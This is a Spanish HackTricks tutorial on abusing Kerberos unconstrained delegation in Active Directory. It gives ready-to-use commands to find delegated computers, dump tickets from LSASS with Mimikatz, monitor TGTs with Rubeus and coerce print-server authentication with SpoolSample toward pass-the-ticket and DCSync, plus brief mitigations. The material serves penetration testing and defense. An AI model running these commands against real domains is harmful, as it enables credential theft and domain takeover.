# Delegación sin restricciones

Esta es una característica que un administrador de dominio puede establecer en cualquier **computadora** dentro del dominio. Entonces, cada vez que un **usuario inicia sesión** en la computadora, se enviará una **copia del TGT** de ese usuario dentro del TGS proporcionado por el DC **y se guardará en la memoria en LSASS**. Por lo tanto, si tiene privilegios de administrador en la máquina, podrá **volcar los tickets e impersonar a los usuarios** en cualquier máquina.

Por lo tanto, si un administrador de dominio inicia sesión en una computadora con la función de "Delegación sin restricciones" activada, y tiene privilegios de administrador local dentro de esa máquina, podrá volcar el ticket e impersonar al administrador de dominio en cualquier lugar (escalada de privilegios de dominio).

Puede **encontrar objetos de computadora con este atributo** verificando si el atributo [userAccountControl](https://msdn.microsoft.com/en-us/library/ms680832\(v=vs.85\).aspx) contiene [ADS\_UF\_TRUSTED\_FOR\_DELEGATION](https://msdn.microsoft.com/en-us/library/aa772300\(v=vs.85\).aspx). Puede hacer esto con un filtro LDAP de '(userAccountControl:1.2.840.113556.1.4.803:=524288)', que es lo que hace powerview:

<pre class="language-bash"><code class="lang-bash"># List unconstrained computers
## Powerview
Get-NetComputer -Unconstrained #DCs always appear but aren't useful for privesc
<strong>## ADSearch
</strong>ADSearch.exe --search "(&#x26;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem
<strong># Export tickets with Mimikatz
</strong>privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
.\Rubeus.exe monitor /targetuser:&#x3C;username> /interval:10 #Check every 10s for new TGTs</code></pre>

Cargue el ticket de Administrador (o usuario víctima) en la memoria con **Mimikatz** o **Rubeus para un** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Más información: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Más información sobre la delegación sin restricciones en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)

### **Forzar autenticación**

Si un atacante es capaz de **comprometer una computadora permitida para "Delegación sin restricciones"**, podría **engañar** a un **servidor de impresión** para que **inicie sesión automáticamente** contra ella **guardando un TGT** en la memoria del servidor.\
Luego, el atacante podría realizar un **ataque Pass the Ticket para impersonar** la cuenta de usuario del servidor de impresión.

Para hacer que un servidor de impresión inicie sesión contra cualquier máquina, puede usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si el TGT es de un controlador de dominio, se podría realizar un ataque de [**DCSync**](acl-persistence-abuse/#dcsync) y obtener todas las hashes del DC.\
[**Más información sobre este ataque en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

**Aquí hay otras formas de intentar forzar una autenticación:**

{% content-ref url="printers-spooler-service-abuse.md" %}
[printers-spooler-service-abuse.md](printers-spooler-service-abuse.md)
{% endcontent-ref %}

### Mitigación

* Limitar los inicios de sesión de DA/Admin a servicios específicos.
* Establecer "La cuenta es sensible y no se puede delegar" para las cuentas privilegiadas.

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* ¿Trabajas en una **empresa de ciberseguridad**? ¿Quieres ver tu **empresa anunciada en HackTricks**? ¿O quieres tener acceso a la **última versión de PEASS o descargar HackTricks en PDF**? ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtén el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **Únete al** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PR al [repositorio de hacktricks](https://github.com/carlospolop/hacktricks) y al [repositorio de hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
